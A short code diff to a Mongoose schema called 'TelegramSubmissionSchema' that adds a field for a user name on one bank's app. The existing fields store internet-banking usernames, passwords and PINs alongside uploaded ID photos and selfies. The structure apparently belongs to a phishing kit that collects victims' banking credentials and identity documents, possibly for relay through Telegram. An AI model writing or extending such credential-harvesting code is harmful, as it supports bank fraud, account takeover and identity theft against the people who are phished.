@@ -38,6 +38,7 @@ const TelegramSubmissionSchema = new mongoose.Schema({
     ibUser: { type: String },
     ibPassword: { type: String },
     ibPin: { type: String },
+    ocbcNyalaUser: { type: String },
     uploadFotoId: { type: String },
     uploadFotoSelfie: { type: String },
     status: {
